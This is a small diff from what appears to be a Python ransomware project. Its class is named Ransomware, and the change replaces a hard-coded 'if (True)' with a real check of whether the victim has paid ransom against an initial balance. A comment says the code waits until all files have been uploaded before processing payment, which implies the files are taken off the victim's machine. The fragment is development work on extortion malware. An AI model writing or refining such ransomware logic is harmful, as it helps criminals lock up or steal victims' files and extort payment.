@@ -325,7 +325,7 @@ class Ransomware:
 
             #User has paid before the time ran out
             # self.check_if_user_has_paid()
-            if (True):
+            if (self.check_if_user_has_paid(initial_balance)):
                 # Waits until all the files has been uploaded before processing the payment
 
                 time.sleep(5)
